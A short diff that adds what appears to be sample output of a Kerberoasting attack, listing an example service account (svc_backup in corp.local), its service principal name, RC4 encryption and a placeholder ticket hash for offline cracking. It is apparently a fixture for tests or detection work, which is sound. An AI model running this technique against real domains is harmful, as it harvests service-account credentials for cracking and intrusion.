@@ -1,0 +1,8 @@
+[*] Action: Kerberoasting
+
+[*] SamAccountName         : svc_backup
+[*] DistinguishedName      : CN=svc_backup,CN=Users,DC=corp,DC=local
+[*] ServicePrincipalName   : backup/dc01.corp.local
+[*] PwdLastSet             : 1/1/2023
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_backup$corp.local$backup/dc01*$ABCDEF
